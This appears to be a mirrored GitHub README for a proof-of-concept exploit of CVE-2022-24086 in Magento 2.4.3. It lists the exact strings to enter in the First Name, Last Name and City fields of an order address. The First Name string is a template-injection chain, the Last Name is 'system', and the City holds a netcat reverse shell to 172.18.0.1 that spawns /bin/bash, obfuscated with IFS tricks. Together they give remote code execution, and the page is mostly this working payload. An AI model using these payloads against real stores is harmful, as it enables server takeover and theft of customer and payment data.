# CVE-2022-24086

Proof of concept of CVE-2022-24086

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/pescepilota](https://github.com/pescepilota) |
| Url      | [https://github.com/pescepilota/CVE-2022-24086](https://github.com/pescepilota/CVE-2022-24086)                                               |
| Stars    | 5                                                          |
| License  | No License                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme

# CVE-2022-24086

Tested with: magento 2.4.3 and sample data
Docker image: docker.io/bitnami/magento:2.4.3-debian-10-r0


First Name:
~~~
{{var this.getTemplateFilter().filter($order.shipping_address.city)}}{{var this.getTemplateFilter().addAfterFilterCallback($order.shipping_address.last_name).filter($order.shipping_address.city)}}
~~~
Last Name:
~~~
system
~~~
City:
~~~
nc${IFS%??}172.18.0.1${IFS%??}9999${IFS%??}-e${IFS%??}/bin/bash
~~~

Testing rce:

![magento-cve-2022-24-086-callback_func](https://user-images.githubusercontent.com/47446178/208698581-d5a026e4-5465-4325-b98d-5365739174a4.png)



## Get the content

```
git clone https://github.com/pescepilota/CVE-2022-24086
cd CVE-2022-24086
```

{% embed url="https://github.com/pescepilota/CVE-2022-24086" %}

<figure><img src="https://avatars.githubusercontent.com/u/47446178?v=4" alt=""><figcaption><p>pescepilota</p></figcaption></figure>
